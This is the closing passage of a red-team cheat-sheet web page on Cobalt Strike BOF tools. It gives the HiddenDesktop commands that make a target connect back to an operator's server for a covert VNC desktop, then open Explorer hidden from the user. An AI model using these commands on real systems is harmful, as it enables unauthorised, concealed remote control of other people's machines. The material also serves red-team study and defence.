Uses VNC connection and server to create a hidden remote desktop connection to your target instead of using RDP. </li>
</ul>
<p><br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Start the HVNC server first
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>HiddenDesktop &lt;server&gt; &lt;port&gt; --&gt; Start a hidden desktop client connection to your listening server
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>hd-launch-explorer --&gt; Then start the Windows explorer browser which should pop up a new window on your system
</span></code></pre></div></p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/cobaltstrikebofcollections.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>